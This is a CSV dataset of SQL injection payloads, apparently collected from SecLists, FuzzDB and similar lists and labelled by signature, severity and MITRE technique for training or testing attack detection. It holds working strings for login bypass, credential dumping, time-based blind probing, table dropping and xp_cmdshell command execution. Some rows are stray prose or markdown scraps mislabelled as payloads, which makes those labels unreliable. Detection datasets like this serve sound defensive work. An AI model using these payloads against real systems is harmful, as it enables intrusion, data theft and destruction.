Payload,Signature,AttackType,Severity,MITRE,Label,Description
' or ''-',GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from SecLists
' or ''=',GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
' or ''='` is equivalent to `',GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
' or ''^',GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from SecLists
' or '1'='1'--,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
' or '7659'='7659,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
' or 'something' = 'some'+'thing',GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
' or 'something' like 'some%',GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
' or 'text' = n'text',GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
' or 'text' > 't',GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
' or 'unusual' = 'unusual',GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
' or 'whatever' in ('whatever'),GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
' or 'x'='x,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from SecLists
' or (EXISTS),GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
' or 0=0 #,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
' or 0=0 --,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
' or 1 --',GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
' or 1 in (select @@version)--,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
' or 1.e('')=',GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
' or 1/*,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
' or 1=1,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
' or 1=1 --,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
' or 1=1 /*,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
' or 1=1 or ''=',GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
' or 2 > 1,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
' or 2 between 1 and 3,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
' or 3=3,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
' or a=a--,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
' or pg_sleep(__TIME__)--,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from SecLists
' or sleep(__TIME__)#,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
' or sleep(__TIME__)=',GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
' or true--,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from SecLists
' or uid like '%,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
' or uname like '%,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
' or user like '%,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
' or userid like '%,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
' or username is not NULL or username = ',GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
' or username like '%,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
' or username like char(37);,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
' select * from information_schema.tables--,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
' select name from syscolumns where id = (select id from sysobjects where name = tablename')--,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
' union (select @@version) --,SQL_UNION_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
' union all select @@version--,SQL_UNION_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
' union select,SQL_UNION_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
"Second Order SQL Injection is a subtype of SQL injection where the malicious SQL payload is primarily stored in the application""",SQL_UNION_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
' union select 0xHEXVALUE --,SQL_UNION_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
"```sql""",SQL_UNION_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
'; DROP TABLE users--,SQL_UNION_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
' waitfor delay '0:0:20' --,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
' waitfor delay '0:0:20' /*,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
"| `UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id))a` | Duplicate column name""",SQL_UNION_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
'%20'HERP,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
'%20or%20''=',GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
'%20or%20'x'='x,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
'%20or%201=1,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
'%2B'HERP,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
'%3B DROP TABLE users%3B --,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
'%3B EXEC xp_cmdshell%28'cmd.exe'%29--,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
"' UNION SELECT username,password FROM users--",GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from SecLists
"UNION ALL SELECT TO_base64(LOAD_FILE(""",SQL_UNION_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
') OR '1'='1--,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload
') OR ('1'='1--,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload
') OR ('a'='a,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload
') OR ('x'='x,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload
') or ('a'='a,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
') or ('x')=('x,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from SecLists
') or pg_sleep(__TIME__)--,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from SecLists
') or sleep(__TIME__)=',GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
') or true--,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from SecLists
') waitfor delay '0:0:20' --,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
') waitfor delay '0:0:20' /*,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
"|unmagicquotes.py | Replaces quote character (""",SQL_UNION_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
')%20or%20('x'='x,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
')%20waitfor%20delay%20'0:0:20'%20--,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
')%20waitfor%20delay%20'0:0:20'%20/*,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
')) or (('x'))=(('x,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from SecLists
')) or pg_sleep(__TIME__)--,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from SecLists
')) or sleep(__TIME__)=',GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
')) waitfor delay '0:0:20' --,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
')) waitfor delay '0:0:20' /*,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
'))%20waitfor%20delay%20'0:0:20'%20--,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
'))%20waitfor%20delay%20'0:0:20'%20/*,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
'))) waitfor delay '0:0:20' --,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
'))) waitfor delay '0:0:20' /*,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
')))) waitfor delay '0:0:20' --,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
')))) waitfor delay '0:0:20' /*,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
'))))) waitfor delay '0:0:20' --,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
'))))) waitfor delay '0:0:20' /*,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
')))))) waitfor delay '0:0:20' --,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
')))))) waitfor delay '0:0:20' /*,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
'));waitfor delay '0:0:__TIME__'--,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
'); --,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
');waitfor delay '0:0:__TIME__'--,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
'; DROP TABLE users--,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from SecLists
'+UNION+SELECT+null--,SQL_UNION_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
'+sqlvuln,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
' OR 1=1 LIMIT 1--,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from SecLists
'/**/AND/**/'1'='1,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
'/**/AND/**/1=1--,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
'/**/GROUP/**/BY/**/columnnames/**/having/**/1=1--,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
'/**/HAVING/**/1=1--,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
'/**/OR/**/''=',GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
'/**/OR/**/'1'='1,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
'/**/OR/**/'a'='a,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
'/**/OR/**/1=1#,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
'/**/OR/**/1=1--,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
'/**/OR/**/1=1/*,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
'/**/OR/**/1=1/**/LIMIT/**/1--,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
'/**/OR/**/1=1/**/ORDER/**/BY/**/1--,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
'/**/UNION/**/SELECT/**/null--,SQL_UNION_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
'/**/or/**/1/**/=/**/1,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
'; --,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
'; DELETE FROM users--,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload
'; DROP TABLE users--,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload
'; DROP TABLE users; --,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
'; DROP TABLE users;#,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
'; DROP TABLE users;--,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
'; DROP TABLE users;--; --,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
'; EXEC xp_cmdshell('cmd.exe')--,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
'; SELECT @@version;--,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
'; SELECT SLEEP(5)--,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload
'; SELECT current_user;--,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
'; SELECT database();--,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
'; SELECT schema();--,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
'; SELECT user();--,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
'; SELECT version();--,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
'; WAITFOR DELAY '00:00:05'--,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload
'; begin declare @var varchar(8000) set @var=':' select @var=@var+'+login+'/'+password+' ' from users where login >,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
'; exec ('sel' + 'ect us' + 'er'),GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
'; exec master..xp_cmdshell,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
'; exec master..xp_cmdshell 'ping 10.10.1.2'--,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
'; exec master..xp_cmdshell 'ping 172.10.1.255'--,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
'; exec xp_regread,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
'; execute immediate 'sel' || 'ect us' || 'er',GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
'; if is_srvrolemember('sysadmin') > 0 waitfor delay '0:0:2' --,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
'; if not((select serverproperty('isintegratedsecurityonly')) <> 0) waitfor delay '0:0:2' --,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
'; if not((select serverproperty('isintegratedsecurityonly')) <> 1) waitfor delay '0:0:2' --,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
'; if not(select system_user) <> 'sa' waitfor delay '0:0:2' --,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
';/**/DROP/**/TABLE/**/users;--,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
';waitfor delay '0:0:__TIME__'--,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
'=0--+,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
"      page.asp?id=1""",GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
'OR '' = '	Allows authentication without a valid username.,COMMAND_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
'OR 1=1--,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
"[...] UNION SELECT""",SQL_UNION_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
admin'--,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from SecLists
"%bf""",GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
'hi' or 'x'='x';,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
'sqlattempt1,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
'sqlvuln,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
'||'6,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
'||'DERP,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
'||PAYLOAD--,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
'||QCMDEXC('QSH CMD(''system dspusrprf PROFILE'')'),GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
'||UTL_HTTP.REQUEST,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
'||utl_http.request('httP://192.168.1.1/')||',GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
(select top 1,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from SecLists
(sqlattempt2),GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
(sqlvuln),GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
(||6),GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
) or ('a'='a,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from SecLists
) or (a=a,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
) or pg_sleep(__TIME__)--,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from SecLists
) or sleep(__TIME__)=',GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from SecLists
) union select * from information_schema.tables;,SQL_UNION_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
) waitfor delay '0:0:20' --,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
) waitfor delay '0:0:20' /*,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
)%20or%20('x'='x,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from SecLists
)%20waitfor%20delay%20'0:0:20'%20--,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
)%20waitfor%20delay%20'0:0:20'%20/*,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
)) or pg_sleep(__TIME__)--,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from SecLists
)) or sleep(__TIME__)=',GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from SecLists
)) waitfor delay '0:0:20' --,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
)) waitfor delay '0:0:20' /*,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
))%20waitfor%20delay%20'0:0:20'%20--,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
))%20waitfor%20delay%20'0:0:20'%20/*,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
))) waitfor delay '0:0:20' --,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
))) waitfor delay '0:0:20' /*,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
)))) waitfor delay '0:0:20' --,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
)))) waitfor delay '0:0:20' /*,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
))))) waitfor delay '0:0:20' --,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
)))))) waitfor delay '0:0:20' --,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
));waitfor delay '0:0:__TIME__'--,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
);waitfor delay '0:0:__TIME__'--,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
"* Use a semi-colon ""`;`"" to add another query",GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
* [PayloadsAllTheThings/SQL Injection/Intruder/Auth_Bypass.txt](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/Intruder/Auth_Bypass.txt),GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
*(|(mail=*)),GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
*(|(objectclass=*)),GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
1' ORDER BY 1--+,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
+sqlvuln,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from SecLists
-- &password=,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from SecLists
--sp_password,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
0 or 1=1,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
031003000270000,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
0x730065006c0065006300740020004000400076006500 ...,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from SecLists
0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q),GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
0x770061006900740066006F0072002000640065006C00 ...,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from SecLists
0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
0x77616974666F722064656C61792027303A303A313027 ...,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from SecLists
0x77616974666F722064656C61792027303A303A31302700 exec(@s),GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
1 and 1=1,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
1 and user_name() = 'dbo',GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
1 exec sp_ (or exec xp_),GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
1 or 1=1,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
1 or pg_sleep(__TIME__)--,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from SecLists
1 or sleep(__TIME__)#,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
1 uni/**/on select all from where,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
1 waitfor delay '0:0:10'--,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
"1"" AND 1=1--",GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
"1"" OR ""1""=""1""--",GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
1' AND (SELECT COUNT(*) FROM information_schema.tables)>0 AND '1'='1,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,Advanced SQL Injection variant
1' AND (SELECT COUNT(*) FROM users) > 0--,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,Hackazon blind SQL injection
1' AND 1 LIKE 1--,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
1' AND 1=1#,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
1' AND 1=1--,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
1' AND 1=1--; --,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
1' OR '1' LIKE '1'--,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
1' OR '1'='1'#,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
1' OR '1'='1'--,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
1' OR '1'='1'--; --,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
1' ORDER BY 1--%2B,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
1' ORDER BY 1--+,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection attack attempt
1' and 1=(select count(*) from tablenames); --,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
1' and non_existant_table = '1,GENERIC_INJECTION,SQL Injection,Critical,T1190,Malicious,SQL Injection payload from FuzzDB
